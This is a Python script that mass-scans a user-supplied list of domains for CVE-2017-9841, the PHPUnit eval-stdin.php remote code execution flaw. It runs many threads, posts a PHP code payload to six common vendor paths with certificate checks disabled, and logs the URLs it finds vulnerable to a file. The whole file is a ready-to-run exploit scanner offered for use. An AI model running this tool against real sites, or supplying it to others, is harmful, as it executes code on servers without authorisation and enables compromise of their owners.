#!/usr/bin/env python3
import requests
import os
import re
import pyfiglet
from colorama import Fore, init
from multiprocessing.dummy import Pool as ThreadPool

# Color
green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.WHITE
cyan = Fore.LIGHTCYAN_EX
yellow = Fore.LIGHTYELLOW_EX

init(autoreset=True)

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

phpfiles = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]

def banner():
    os.system("cls||clear")
    __banner__ = pyfiglet.figlet_format("CVE-2017-9841", font="slant", justify="center")
    print(red + __banner__)
    print(f"\t\t\t{red}[ {white}Created By X - MrG3P5 {red}]")
    print(f"\t    {red}[ {white}Remote Code Execution (RCE) (Unauthenticated) {red}]\n")


def Exploit(domain):
    try:
        vuln = False
        for x in phpfiles:
            site = "https://" + domain + x
            req = requests.get(site, headers={
                "Content-Type" : "text/html",
                "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            }, data="<?php echo md5(phpunit_rce); ?>", verify=False)

            if "6dd70f16549456495373a337e6708865" in req.text:
                vuln = True
            else:
                pass

        if vuln:
            print(f"{white}--> {green}Vulnerable: {domain}")
            open("result.txt", "a").write(site + "\n")
        else:
            print(f"{white}--> {red}Not Vulnerable: {domain}")
    except:
        print(f"{white}--> {red}Not Vulnerable: {domain}")


if __name__=="__main__":
    banner()
    domainList = [j.strip("\n\r") for j in open(input(f"{Fore.WHITE}--> Domain List : "), "r", encoding="utf-8").readlines()]
    Thread = input(f"{Fore.WHITE}--> Thread : ")
    pool = ThreadPool(int(Thread))
    pool.map(Exploit, domainList)
    pool.close()
    pool.join()
